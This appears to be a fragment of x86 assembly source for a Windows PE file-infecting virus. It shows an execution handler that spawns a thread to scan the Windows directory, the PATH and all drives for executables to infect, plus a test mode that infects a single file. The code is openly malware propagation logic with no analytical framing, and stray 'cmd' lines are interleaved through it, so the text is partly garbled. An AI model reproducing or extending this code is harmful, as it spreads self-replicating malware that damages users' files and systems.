   ; onexec() handler
   ; called when an infected PE file is executed

   ;TESTFILE               equ     ?       ; only infect TESTFILE.EXE and quit

   cmd
   onexec:                 pusha
   cmd
       IFDEF   TESTFILE
   cmd
                           x_push  edx, TESTFILE.EXE~
   cmd
                           mov     edx, esp
   cmd
                           call    infect_file
   cmd
                           x_pop
   cmd
       ELSE
   cmd
                           push    ecx
   cmd
                           push    esp
   cmd
                           push    0
   cmd
                           push    0
   cmd
                           push    offset threadfunc
   cmd
                           push    256*1024
   cmd
                           push    0
   cmd
                           call    xxCreateThread
   cmd
                           pop     ecx
   cmd
       ENDIF ; TESTFILE
                           popa
   cmd
                           ret
   cmd

   threadfunc:             pusha
   cmd
                           seh_init
   cmd
                           call    scanner
   cmd
                           seh_done
   cmd
                           popa
   cmd
                           ret
   cmd

   scanner:
   cmd
                           lea     edi, ff
   cmd

                           call    process_windir  ; %windir%
   cmd
                           call    process_path    ; PATH
   cmd
                           call    process_drives  ; all other files
   cmd

                           ret
   cmd
